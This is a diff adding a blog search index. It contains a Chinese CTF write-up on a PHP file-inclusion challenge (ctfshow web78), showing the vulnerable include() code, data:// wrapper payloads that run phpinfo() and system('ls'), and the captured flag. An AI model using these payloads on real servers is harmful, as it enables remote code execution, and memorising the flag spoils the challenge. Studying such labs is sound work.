@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>文件包含</title>
+    <url>/2022/02/25/article-title/</url>
+    <content><![CDATA[<p><img src="C:\Users\asus\Desktop\1.png"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2022/02/25/hello-world/</url>
+    <content><![CDATA[<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><?php
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}
+发现 include 包含函数，选择使用 data 伪协议 data://text/plain,构造 payload：
+?file=data://text/plain,<?php phpinfo();?>
+<p>成功出现 phpinfo()页面</p>
+<p>然后输如查询目录的指令，发现有 flag.php 文件：<br>?file=data://text/plain,<?php system("ls");?><br><img src="/images/1.png"><br>使用 tac 命令读取文件，成功读取 flag:ctfshow{7bc171e1-06c8-4e6c-8e13-33585ea3d0be}</p>
+<h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><p>条件竞争，限制了并发，先做后面的。</p>
+]]></content>
+  </entry>
+</search>
